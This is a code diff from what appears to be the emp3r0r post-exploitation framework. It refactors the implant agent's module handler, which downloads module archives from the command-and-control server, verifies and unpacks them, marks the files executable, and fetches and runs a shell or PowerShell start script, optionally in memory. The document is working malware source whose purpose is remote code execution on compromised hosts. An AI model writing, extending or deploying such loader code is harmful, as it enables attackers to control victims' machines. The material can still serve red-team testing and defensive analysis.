@@ -4,96 +4,107 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"os/exec"
+	"path/filepath"
+	"runtime"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/mholt/archiver/v3"
 )
 
-func moduleHandler(modName, checksum string) (out string) {
-	tarball := RuntimeConfig.AgentRoot + "/" + modName + ".tar.xz"
-	modDir := RuntimeConfig.AgentRoot + "/" + modName
-	start_sh := modDir + "/start.sh"
+// moduleHandler downloads and runs modules from C2
+func moduleHandler(modName, checksum string, inMem bool) (out string) {
+	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
+	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
+	startScript := fmt.Sprintf("%s.%s", modName, getScriptExtension())
 
-	// if we have already downloaded the module, dont bother downloading again
+	var err error
+
+	// cd to module dir
+	defer os.Chdir(RuntimeConfig.AgentRoot)
+	os.Chdir(modDir)
+
+	if !inMem {
+		if downloadErr := downloadAndVerifyModule(tarball, checksum); downloadErr != nil {
+			return downloadErr.Error()
+		}
+
+		if extractErr := extractAndRunModule(modDir, tarball); extractErr != nil {
+			return extractErr.Error()
+		}
+	}
+
+	out, err = runStartScript(startScript, modDir)
+	if err != nil {
+		return fmt.Sprintf("running start script: %v: %s", err, out)
+	}
+	return out
+}
+
+func getScriptExtension() string {
+	if runtime.GOOS == "windows" {
+		return "ps1"
+	}
+	return "sh"
+}
+
+func downloadAndVerifyModule(tarball, checksum string) error {
 	if tun.SHA256SumFile(tarball) != checksum {
-		_, err := DownloadViaCC(modName+".tar.xz",
-			tarball)
-		if err != nil {
-			return err.Error()
+		if _, err := DownloadViaCC(tarball, tarball); err != nil {
+			return err
 		}
 	}
 
 	if tun.SHA256SumFile(tarball) != checksum {
-		log.Print("checksum failed, restarting...")
+		log.Print("Checksum failed, restarting...")
 		os.RemoveAll(tarball)
-		moduleHandler(modName, checksum)
+		return downloadAndVerifyModule(tarball, checksum) // Recursive call
 	}
+	return nil
+}
 
-	// extract files
+func extractAndRunModule(modDir, tarball string) error {
 	os.RemoveAll(modDir)
-	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
-		return fmt.Sprintf("Unarchive module tarball: %v", err)
+	if err := util.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
+		return fmt.Errorf("unarchive module tarball: %v", err)
 	}
 
-	// download start.sh
-	os.RemoveAll(start_sh)
-	_, err := DownloadViaCC(modName+".sh",
-		start_sh)
+	return processModuleFiles(modDir)
+}
+
+func processModuleFiles(modDir string) error {
+	files, err := os.ReadDir(modDir)
 	if err != nil {
-		return fmt.Sprintf("Downloading start.sh: %v", err)
+		return fmt.Errorf("processing module files: %v", err)
 	}
 
-	// exec
-	pwd, err := os.Getwd()
-	if err != nil {
-		return fmt.Sprintf("pwd: %v", err)
-	}
-	err = os.Chdir(modDir)
-	if err != nil {
-		return fmt.Sprintf("cd to module dir: %v", err)
-	}
-
-	// process files in module archive
-	libs_tarball := "libs.tar.xz"
-	files, err := os.ReadDir("./")
-	if err != nil {
-		return fmt.Sprintf("Processing module files: %v", err)
-	}
 	for _, f := range files {
-		os.Chmod(f.Name(), 0700)
-		if util.IsExist(libs_tarball) {
-			os.RemoveAll("libs")
-			err = archiver.Unarchive(libs_tarball, "./")
-			if err != nil {
-				return fmt.Sprintf("Unarchive %s: %v", libs_tarball, err)
+		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
+			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
+		}
+
+		libsTarball := filepath.Join(modDir, "libs.tar.xz")
+		if util.IsExist(libsTarball) {
+			os.RemoveAll(filepath.Join(modDir, "libs"))
+			if err := util.Unarchive(libsTarball, modDir); err != nil {
+				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
 			}
 		}
 	}
+	return nil
+}
 
-	cmd := exec.Command(emp3r0r_data.DefaultShell, start_sh)
+func runStartScript(startScript, modDir string) (string, error) {
+	// cd to module dir
+	defer os.Chdir(RuntimeConfig.AgentRoot)
+	os.Chdir(modDir)
 
-	// debug
-	shdata, err := os.ReadFile(start_sh)
+	// Download the script payload
+	payload, err := DownloadViaCC(startScript, "")
 	if err != nil {
-		log.Printf("Read %s: %v", start_sh, err)
+		return "", fmt.Errorf("downloading %s: %w", startScript, err)
 	}
-	log.Printf("Running start.sh:\n%s", shdata)
+	scriptData := payload
 
-	outbytes, err := cmd.CombinedOutput()
-	if err != nil {
-		out = fmt.Sprintf("Running module: %s: %v", outbytes, err)
-	}
-
-	defer func() {
-		os.Chdir(pwd)
-		// remove module files if it's non-interactive
-		if !util.IsStrInFile("echo emp3r0r-interactive-module", start_sh) {
-			os.RemoveAll(modDir)
-		}
-	}()
-
-	return string(outbytes)
+	log.Printf("Running %s:\n%s...", startScript, scriptData[:100])
+	return RunModuleScript(scriptData)
 }
